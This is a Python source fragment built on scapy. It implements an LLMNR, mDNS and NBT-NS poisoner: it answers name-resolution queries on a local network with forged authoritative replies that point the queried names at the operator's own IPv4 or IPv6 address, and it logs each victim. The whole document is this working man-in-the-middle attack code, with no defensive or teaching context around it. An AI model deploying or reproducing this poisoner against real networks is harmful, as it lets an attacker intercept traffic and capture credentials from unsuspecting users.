def make_poisoner(iface, myip, ll6, stats):
    """Return a prn() that poisons LLMNR/NBT-NS/mDNS queries with our IP."""
    m = my_mac(iface)

    def dns_a(p, dns, kind):
        qname = dns[DNSQR].qname
        qtype = dns[DNSQR].qtype
        if qtype == 28:
            rr = DNSRR(rrname=qname, type="AAAA", ttl=30, rdata=ll6)
        else:
            rr = DNSRR(rrname=qname, type="A", ttl=30, rdata=myip)
        sendp(Ether(src=m, dst=p[Ether].src) /
              IP(src=myip, dst=p[IP].src) /
              UDP(sport=p[UDP].dport, dport=p[UDP].sport) /
              DNS(id=dns.id, qr=1, aa=1, qd=dns.qd, an=rr),
              iface=iface, verbose=0)
        stats[kind] += 1
        print(f"      [{kind}] {qname.decode(errors='replace').rstrip('.')} "
              f"from {p[IP].src} -> {'AAAA ' if qtype == 28 else ''}{myip}")

    def nbns_a(p):
        hdr = p[NBNSHeader]
        req = p[NBNSQueryRequest]
        sendp(Ether(src=m, dst=p[Ether].src) /
              IP(src=myip, dst=p[IP].src) /
              UDP(sport=137, dport=p[UDP].sport) /
              NBNSHeader(NAME_TRN_ID=hdr.NAME_TRN_ID, RESPONSE=1,
                         QDCOUNT=0, ANCOUNT=1) /
              NBNSQueryResponse(RR_NAME=req.QUESTION_NAME,
                                SUFFIX=req.SUFFIX,
                                QUESTION_TYPE=0x0020,
                                QUESTION_CLASS=0x0001,
                                TTL=300, ADDR_ENTRY=[myip]),
              iface=iface, verbose=0)
        stats["nbns"] += 1
        print(f"      [nbns] NBT-NS query from {p[IP].src} -> {myip}")

    def pois(p):
        if not (p.haslayer(UDP) and p.haslayer(IP) and p.haslayer(Ether)):
            return
        if p[IP].src == myip:
            return
        dport = p[UDP].dport
        if dport in (5355, 5353):
            # scapy does not auto-bind DNS to 5355/5353 -> parse raw
            try:
                dns = DNS(bytes(p[UDP].payload))
            except Exception:
                return
            if dns.qr == 0 and dns.qd and dns[DNSQR].qtype in (1, 28):
                dns_a(p, dns, "llmnr" if dport == 5355 else "mdns")
        elif dport == 137 and p.haslayer(NBNSQueryRequest) and \
                p[NBNSHeader].RESPONSE == 0:
            nbns_a(p)

    return pois


